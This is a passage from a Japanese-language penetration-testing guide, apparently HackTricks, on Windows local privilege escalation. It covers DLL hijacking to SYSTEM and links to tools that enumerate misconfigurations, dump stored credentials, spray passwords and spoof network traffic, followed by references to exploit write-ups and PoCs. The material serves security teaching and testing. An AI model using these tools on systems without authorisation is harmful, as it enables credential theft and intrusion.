name pipes を使用して [**high integrity から System へ移行する方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **loaded** される dll を **hijack** できれば、その permissions で arbitrary code を実行できます。したがって、Dll Hijacking はこの種の privilege escalation にも有効です。さらに、High Integrity process から実行する場合は、dll の load に使用される folders に対する **write permissions** があるため、はるかに **簡単に実行できます**。\
**Dll hijacking については** [**こちらで詳しく学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を check (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの possible misconfigurations を check し、info を収集 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を check**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP に保存された session information を抽出します。local では -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体に対して Spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc 用 Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson により DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を検索するために host を enumerate します（privesc tool というより info gather tool です）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# への port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を check（github に executable precompiled があります）。推奨されません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- possible misconfigurations を check（python からの exe）。推奨されません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool（正常に動作するために accesschk への access は必要ありませんが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host に install されている .NET の version を確認するには、次のように実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters向けWindows Privilege Escalation Methods](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532によるSYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP（RCE）およびkernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA Systemに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [A Link to the Past. WindowsにおけるSymbolic Linksの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: WindowsにおけるDangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` foldersからのloading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges、解決済み](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPEのためのCLDFLTとDirectX Kernel Race Conditionsのchaining](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11におけるFull Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletesを悪用したPrivilege Escalationとその他の優れたtricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013、Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultの調査](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image ChangeがPrivilege Escalationにつながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからのSsh Private Keysの抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
{{#include ../../banners/hacktricks-training.md}}
